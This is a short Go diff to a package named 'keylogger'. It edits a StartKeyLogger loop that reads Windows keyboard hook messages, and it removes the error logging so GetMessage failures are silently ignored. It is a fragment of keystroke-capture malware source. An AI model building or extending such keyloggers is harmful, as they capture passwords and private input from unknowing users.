@@ -6,7 +6,6 @@ package keylogger
 import (
 	"errors"
 	"fmt"
-	"log"
 	"strings"
 	"sync"
 	"syscall"
@@ -101,9 +100,8 @@ func StartKeyLogger() error {
 			break
 		}
 		msg := &winapi.MSG{}
-		gotMessage, err := winapi.GetMessage(msg, 0, 0, 0)
+		gotMessage, _ := winapi.GetMessage(msg, 0, 0, 0)
 		if !gotMessage {
-			log.Println(err)
 			break
 		}
 		press := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(msg.LParam))
